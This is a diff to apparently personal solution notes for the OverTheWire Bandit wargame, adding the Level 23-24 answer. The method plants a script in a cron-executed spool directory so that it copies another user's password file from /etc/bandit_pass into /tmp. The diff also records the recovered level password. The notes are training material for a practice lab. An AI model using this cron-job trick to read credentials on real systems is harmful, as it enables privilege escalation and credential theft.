@@ -169,5 +169,18 @@ Password: 0Zf11ioIjMVN551jX3CmStKLYqjk54Ga
 
 #Level 23-24: 
 
+Method: cat > /var/spool/bandit24/foo/cat_passwd << EOF
+        #!/bin/bash
+        install --mode=444 /etc/bandit_pass/bandit24 /tmp/bandit_pass_bandit24
+        EOF
+
+        chmod +x /var/spool/bandit24/foo/cat_passwd
+        sleep 60
+        cat /tmp/bandit_pass_bandit24
+
+Password: gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8
+
+#Level 24-25:
+
 Method: 
-Password:
+Password: 
